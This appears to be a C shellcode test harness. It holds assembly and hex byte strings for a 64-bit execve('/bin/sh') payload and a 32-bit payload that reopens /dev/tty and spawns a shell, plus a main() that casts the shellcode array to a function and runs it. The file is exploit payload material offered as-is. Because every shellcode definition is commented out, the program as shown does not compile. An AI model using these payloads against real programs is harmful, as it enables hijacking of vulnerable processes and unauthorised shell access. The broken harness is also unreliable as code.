 /*
    ; execve("/bin/sh", ["/bin/sh"], NULL)
 
    section .text
            global _start
 
    _start:
            xor     rdx, rdx
            mov     qword rbx, '//bin/sh'
            shr     rbx, 0x8
            push    rbx
            mov     rdi, rsp
            push    rax
            push    rdi
            mov     rsi, rsp
            mov     al, 0x3b
            syscall
"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
*/

/*
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
*/
 
int main(void)
{
    // char shellcode[] =
    // "\x48\x31\xd2"                                  // xor    %rdx, %rdx
    // "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov	$0x68732f6e69622f2f, %rbx
    // "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
    // "\x53"                                          // push   %rbx
    // "\x48\x89\xe7"                                  // mov    %rsp, %rdi
    // "\x50"                                          // push   %rax
    // "\x57"                                          // push   %rdi
    // "\x48\x89\xe6"                                  // mov    %rsp, %rsi
    // "\xb0\x3b"                                      // mov    $0x3b, %al
    // "\x0f\x05"; 
    // syscall
    //char shellcode[] = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";                                     
    //char shellcode[] = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
    (*(void (*)()) shellcode)();
     
    return 0;
}